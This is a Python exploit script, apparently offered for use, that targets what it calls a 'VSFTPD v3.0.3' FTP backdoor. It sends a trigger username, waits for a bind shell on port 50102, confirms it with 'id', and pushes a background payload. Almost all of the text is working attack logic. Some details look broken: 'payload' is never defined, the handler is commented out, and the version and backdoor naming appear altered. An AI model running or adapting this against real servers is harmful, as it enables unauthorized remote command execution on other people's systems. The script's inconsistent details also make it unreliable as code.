import socket
import time
import argparse
from pwn import *


def connect(host, port):
    try:
        s = remote(host, port)
        return s
    except Exception as e:
        print(f"Error connecting to {host}:{port} - {e}")
        return None


def exploit(host, port):
    nsock = connect(host, 50102)
    if nsock:
        print("The port used by the backdoor bind listener is already open")
        handle_backdoor(nsock)
        return

    s = connect(host, port)
    if not s:
        print("Failed to connect to the FTP service")
        return

    banner = s.recv(1024).decode("utf-8").strip()
    print(f"Banner: {banner}")

    s.send(b"USER roodkcab: \r\n")
    resp = s.recv(1024).decode("utf-8").strip()
    print(f"USER: {resp}")

    if "530" in resp:
        print(
            "This server is configured for anonymous only and the backdoor code cannot be reached"
        )
        s.close()
        return

    if "331" not in resp:
        print(f"This server did not respond as expected: {resp}")
        s.close()
        return

    s.send(
        f"PASS {''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(6))}\r\n".encode(
            "utf-8"
        )
    )
    time.sleep(5)

    nsock = connect(host, 50102)
    if nsock:
        print("Backdoor service has been spawned, handling...")
        handle_backdoor(nsock)
        return

    s.close()


def handle_backdoor(s):
    s.send(b"id\n")
    r = s.recv(1024).decode("utf-8").strip()
    if "uid=" not in r:
        print("The service on port 50102 does not appear to be a shell")
        s.close()
        return

    print(f"UID: {r}")
    s.send(b"nohup " + payload.encode() + b" >/dev/null 2>&1")
    # handler(s)  # You need to implement this or use an existing handler


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="VSFTPD v3.0.3 amdorj Backdoor Command Execution"
    )
    parser.add_argument("TARGET_IP", help="Target IP address")
    parser.add_argument(
        "--port", type=int, default=21, help="Target port, default is 21"
    )
    args = parser.parse_args()

    exploit(args.TARGET_IP, args.port)
